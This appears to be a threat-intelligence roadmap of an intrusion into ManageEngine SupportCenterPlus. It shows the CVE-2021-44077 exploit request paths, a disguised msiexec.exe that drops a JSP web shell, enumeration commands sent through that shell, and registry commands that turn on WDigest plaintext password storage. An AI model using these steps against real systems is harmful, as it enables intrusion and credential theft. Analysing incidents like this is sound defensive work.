# Attack Roadmap

### Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration

<img src="AttackRoadmap.png"  width="20%" height="20%">

## Let's Summarize Each Step
#### 1. Exploit [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) The exploit looks very similar to a publicly available POC exploit on [GitHub](https://github.com/horizon3ai/CVE-2021-44077).
##### Exploit Method: RCE via two HTTP requests.
 - Request 1: POST request to /RestAPI/ImportTechnicians?step=1 contains `msiexec.exe` and was written to C:\Program Files\ManageEngine\SupportCenterPlus\bin\msiexec.exe.

 - Request 2: GET request to /RestAPI/s247action?execute=s247AgentInstallationProcess&apikey=asdasd, and invoke the uploaded `msiexec.exe`.

  ![image](https://github.com/user-attachments/assets/ce028655-d691-4c2d-86e3-370d9ce76742)

#### 2. Web Shell Deployment:
- The Malicous msiexec.exe contains encoded web shell once `msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn` there is a webshell file `jm2.jsp` written to `C:\Program Files\ManageEngine\SupportCenterPlus\custom\login\fm2.jsp`, this way will allow the threat actor to maintain the access with no need to execute the exploit once again.
- Now you have an access to the system through `http://<victim_ip:8080/custom/login/jm2.jsp` then you can `Execute Commands` and `View and Download files`
  
  ![image](https://github.com/user-attachments/assets/65b4b314-1bf1-44cb-b281-8c5fa18156ac)

#### 3. System Enumeration
- Then basic enumuration is made.
  ```
  https://server.example/custom/login/fm2.jsp?cmd=arp -a
  https://server.example/custom/login/fm2.jsp?cmd=systeminfo
  https://server.example/custom/login/fm2.jsp?cmd=tasklist
  https://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain
  ```
#### 4. Credential Dumping
- The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled `LSASS` stores passwords in Plaintext.
- Command Used:
  ```
   powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
  ```
  - Command To Enable WDigest:
  ```
  powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
  ```
  
